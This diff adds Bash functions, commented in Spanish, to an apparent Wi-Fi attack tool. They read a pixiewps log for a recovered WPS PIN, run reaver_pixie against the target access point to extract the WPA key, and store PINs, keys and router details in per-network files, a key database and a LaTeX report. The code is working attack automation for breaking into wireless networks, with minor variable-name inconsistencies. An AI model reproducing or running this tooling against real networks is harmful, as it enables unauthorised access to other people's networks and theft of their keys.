@@ -1,0 +1,102 @@
+AnalizarLogPixiewps(){
+  lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
+  for A in `seq 1 $lineas_log` ; do 
+    linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+    if [[ $linea == *"WPS pin"* ]] 
+    then 
+      if [[ $linea == *"not found"* ]]
+      then 
+	echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" > $ARCHIVO_STATUSBAR
+	AgregarBssidDatabases 2
+	ATAQUE_ACABADO="SI"
+	if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
+	return 1
+      fi
+    PIN_WPS=`echo $linea | awk -F":" {' print $2 '} `
+   
+    echo "$BSSID : PIN WPS CONSEGUIDO, RECUPERANDO CLAVE WPA, ESPERA ..." > $ARCHIVO_STATUSBAR
+
+    X13="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
+
+    reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS &>> $ARCHIVO_TXT_ATAQUE
+
+    let vez=2
+    if EsperarAcabarReaver
+    then
+       if [ $ATAQUE_DETENIDO = "SI" ]; then return; fi	
+       RecuperarClaveWpa
+    else
+      CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
+    fi
+    
+    echo $fabricante > $ARCHIVO_TXT_ATAQUE
+    echo $modelo >> $ARCHIVO_TXT_ATAQUE
+    echo $numero_de_modelo >> $ARCHIVO_TXT_ATAQUE
+    echo $numero_de_serie >> $ARCHIVO_TXT_ATAQUE
+    echo $device_name  >> $ARCHIVO_TXT_ATAQUE
+    echo "- ESSID : "$ESSID >> $ARCHIVO_TXT_ATAQUE
+    echo "- BSSID : "$BSSID  >> $ARCHIVO_TXT_ATAQUE
+    echo "- PIN WPS : "$PIN_WPS >> $ARCHIVO_TXT_ATAQUE
+    echo "- KEY WPA : "$CLAVE_WPA >> $ARCHIVO_TXT_ATAQUE
+    
+    echo $fabricante > $CARPETA_KEYS"$ESSID.DATOS"
+    echo $modelo >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo $numero_de_modelo >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo $numero_de_serie >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo $device_name  >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- ESSID : "$ESSID >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- BSSID : "$BSSID  >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- PIN WPS : "$PIN_WPS >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- KEY WPA : "$CLAVE_WPA >> $CARPETA_KEYS"$ESSID.DATOS"
+    
+    fabricante=$(echo $fabricante | awk -F":" {' print $2 '})
+    modelo=$(echo $modelo | awk -F":" {' print $2 '})
+    numero_de_modelo=$(echo $numero_de_modelo | awk -F":" {' print $2 '})
+    numero_de_serie=$(echo $numero_de_serie | awk -F":" {' print $2 '})
+    device_name=$(echo $device_name | awk -F":" {' print $2 '})
+
+    #Inicio Infome Latex PIXIEWPS-Template.tex
+    X1="pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee"
+    X2=$PIN_WPS
+    X3="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
+    X4=$CARPETA_KEYS"$ESSID.DATOS"
+    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" $Pke $PKr $EHash1 $EHash2 $AuthKey $Enrollee $X2 "$X3" "$X4"`)
+    #Fin Latex
+    
+    if ! grep -q $BSSID $ARCHIVO_DATABASE_KEYS
+    then
+	if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ]; then CLAVE_WPA="?"; fi 
+	echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|
+"$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+    else
+	if [ $(grep $BSSID $ARCHIVO_DATABASE_KEYS | awk -F"|" {'print $4'}) = "?" ] && [ $CLAVE_WPA != "?" ] 
+	then
+	  sed '/'$BSSID'/d' $ARCHIVO_DATABASE_KEYS | sed '/^$/d' > TEMPORAL
+	  mv TEMPORAL $ARCHIVO_DATABASE_KEYS
+	  echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|
+"$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+	fi
+    fi    
+    echo "$BSSID : ATAQUE FINALIZADO, SE HA GENERADO EL ARCHIVO $ESSID.DATOS" > $ARCHIVO_STATUSBAR
+   
+    AgregarBssidDatabases 3
+    ATAQUE_ACABADO="SI"
+    if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+  fi 
+done
+unset lineas_log A linea PIN_WPS CLAVE_WPA fabricante modelo numero_de_modelo numero_de_serie device_name  
+}
+
+RecuperarClaveWpa() {
+  lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
+  let A=0
+  for A in `seq 1 $lineas_log` ; do 
+    linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+    if [[ $linea == *"WPA PSK"* ]] 
+    then 
+      CLAVE_WPA=`echo $linea | awk -F":" {' print $2 '}` 
+      CLAVE_WPA=`echo $CLAVE_WPA | awk -F"'" {' print $2 '}`
+    fi
+  done
+}
+
